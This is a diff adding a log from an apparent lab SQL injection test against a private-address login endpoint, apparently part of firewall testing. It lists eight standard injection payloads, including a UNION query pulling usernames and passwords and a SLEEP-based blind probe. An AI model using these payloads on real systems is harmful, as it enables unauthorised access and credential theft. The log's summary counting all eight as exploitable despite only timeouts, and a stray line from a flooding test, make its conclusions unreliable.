@@ -1,0 +1,55 @@
+============================================================
+Attack Type: SQL_Injection
+Timestamp: 2025-10-29_20-10-08
+Target: 172.20.0.10:5000
+============================================================
+
+[20:09:18] 🔴 ATTACK INITIATED: SQL Injection
+[20:09:18] Target: Victim Server (172.20.0.10:5000/login)
+[20:09:18] Testing various SQL injection techniques...
+[20:09:18] 
+[Test 1/8] Authentication Bypass (OR condition)
+[20:09:18]    Payload: ' OR '1'='1
+[20:09:23]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:24] 
+[Test 2/8] Comment Injection
+[20:09:24]    Payload: admin'--
+[20:09:29]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:30] 
+[Test 3/8] UNION-based Injection
+[20:09:30]    Payload: ' UNION SELECT NULL, username, password FROM users--
+[20:09:31] Wave 2 Complete: 0 successful (0.0%), 2 blocked, 98 timeout
+[20:09:35]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:35] Wave 3/5: Sending 100 HTTP GET requests...
+[20:09:36] 
+[Test 4/8] Boolean-based Injection
+[20:09:36]    Payload: ' OR 1=1--
+[20:09:41]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:42] 
+[Test 5/8] Time-based Blind Injection
+[20:09:42]    Payload: admin' AND SLEEP(5)--
+[20:09:47]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:48] 
+[Test 6/8] Alternative OR condition
+[20:09:48]    Payload: ' OR 'a'='a
+[20:09:53]    ⏱️  Timeout - Possible time-based blind injection
+[20:09:54] 
+[Test 7/8] Nested condition bypass
+[20:09:54]    Payload: 1' OR '1' = '1')) --
+[20:09:59]    ⏱️  Timeout - Possible time-based blind injection
+[20:10:00] 
+[Test 8/8] Block comment injection
+[20:10:00]    Payload: admin' /*
+[20:10:05]    ⏱️  Timeout - Possible time-based blind injection
+[20:10:06] 
+==================================================
+[20:10:06] 📊 ATTACK SUMMARY
+[20:10:06] ==================================================
+[20:10:06] Total Payloads Tested: 8
+[20:10:06] Exploitable Vulnerabilities: 8
+[20:10:06] Blocked by Firewall: 0
+[20:10:06] Protected/Failed: 0
+[20:10:08] 
+🛡️  Firewall SQL Injection Alerts: 0
+[20:10:08] 
+⏱️  Attack Duration: 50.07 seconds
